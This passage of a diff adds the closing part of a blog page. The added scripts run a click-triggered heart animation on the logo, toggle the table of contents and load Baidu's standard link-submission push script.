+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
